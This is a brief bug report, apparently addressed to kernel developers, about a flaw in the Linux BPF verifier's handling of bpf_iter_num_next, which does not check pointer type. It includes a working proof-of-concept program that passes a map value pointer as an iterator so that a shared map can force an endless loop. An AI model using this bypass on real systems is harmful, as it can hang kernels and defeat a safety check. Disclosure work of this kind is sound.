when you new an iter `it`, the iter meta (start, end) is stored on the stack with a struct `struct bpf_iter_num`. The verifier marks corresponding stack slots with STACK_ITER and guarantee no instructions can modify these stack slots except the kfunc bpf_iter_num_*.
When you enumerate on the iter with `bpf_iter_num_next` and the passed pointer of `struct bpf_iter_num` (in register R1).
The verifier checks if the stack slots pointing by the offset of R1 is STACK_ITER to ensure you pass an valid `struct bpf_iter_num`.
However, it doesn't check the type of R1, which can be any other types.
Like below, I pass a map value pointer to it, whose offset is 0. When taking 0 as the offset to checking the stack slot type, it maps to the stack slots of variable `it` whose type is STACK_ITER (these stack slots cannot be modified with general load/store anymore) and thus it can pass the verification.
The consequence of this bug is that since map is shared, this process and other process owning the map can modify the iter range to make it always loops.
But this bug is kind of trivial is because usually using `bpf_iter_num_new` and `bpf_iter_num_next` requires priviliges and thus this attack cannot be lauched in an unpriv mode.
int iter_while_loop(const void *ctx)
{
        struct bpf_iter_num it;
        int *v;

        int *map_val = NULL;
        int key = 0;

        map_val = bpf_map_lookup_elem(&arr_map, &key);
        if (!map_val)
                return 0;

        bpf_iter_num_new(&it, 0, 3);
        // The benign one should be: v = bpf_iter_num_next(&it)
        while ((v = bpf_iter_num_next((struct bpf_iter_num*)map_val))) {
                bpf_printk("ITER_BASIC: E1 VAL: v=%d", *v);
        }
        bpf_iter_num_destroy(&it);

        return 0;
}
